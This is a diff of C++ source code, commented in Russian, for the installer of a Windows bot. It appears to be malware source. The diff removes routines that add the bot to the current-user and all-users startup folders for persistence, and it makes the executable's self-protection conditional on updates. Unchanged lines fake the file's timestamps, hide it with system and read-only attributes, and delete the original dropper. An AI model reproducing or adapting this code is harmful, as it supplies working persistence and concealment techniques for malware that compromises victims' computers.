@@ -28,39 +28,6 @@ namespace INSTALLERDEBUGSTRINGS
 //---------------------------------------------------------------------------
 
 
-void DoAddLinkToAutorun(TBotStrings &Added, const char* FileName, const string &LinkName)
-{
-	if (!LinkName.IsEmpty() && (Added.IndexOf(FileName) < 0))
-	{
-		// создаём нужный ярлык
-		CreateLink(LinkName.t_str(), FileName, NULL, NULL, NULL);
-		if (File::IsExists(LinkName.t_str()))
-		{
-			Added.Add(LinkName);
-            INSTDBG("Installer", "Добавляем ярлык в автозагрузку %s", LinkName.t_str());
-        }
-    }
-}
-//----------------------------------------------------------------------------
-
-void AddBotToAutoRun(const char* FileName)
-{
-	// Создаём имя ярлыка
-	TBotStrings Added;
-    string Link = BOT::GetBotLinkName();
-	// Создаём ярлыки в папках автозагрузки
-	string LinkFile;
-	// Паапка автозагрузки текущего пользователя
-	LinkFile = GetSpecialFolderPathA(CSIDL_STARTUP, Link);
-	DoAddLinkToAutorun(Added, FileName, LinkFile);
-
-	// Папка автозагрузки всех пользователей
-	LinkFile = GetSpecialFolderPathA(CSIDL_COMMON_STARTUP, Link);
-	DoAddLinkToAutorun(Added, FileName, LinkFile);
-}
-//----------------------------------------------------------------------------
-
-
 //----------------------------------------------------
 //  Install - Функция инсталирует бота
 //
@@ -83,7 +50,7 @@ bool BOT::Install(const char* FileName, bool IsUpdate)
 	INSTDBG("Installer", "Инсталируем бот. Exe бота %s", BotFile.t_str());
 
 	// Снимаем защиту и удаляем файл
-	Unprotect();
+	if (IsUpdate) Unprotect();
 	DeleteBotFile(BotFile.t_str(), INFINITE, false);
 
 	//  Копируем файл
@@ -95,9 +62,6 @@ bool BOT::Install(const char* FileName, bool IsUpdate)
 		// Устанавливаем дату и атрибуты файла
 		SetFakeFileDateTime(BotFile.t_str());
 		pSetFileAttributesA(BotFile.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
-
-		// Добавляем бота в автозагрузку
-		AddBotToAutoRun(BotFile.t_str());
     }
 
 
@@ -114,7 +78,7 @@ bool BOT::Install(const char* FileName, bool IsUpdate)
 
 
 	// Ставим защиту на ехе бота
-	Protect(BotFile.t_str());
+	if (IsUpdate) Protect(NULL);
 
 	// Удаляем файл источник
 	pDeleteFileA(FileName);
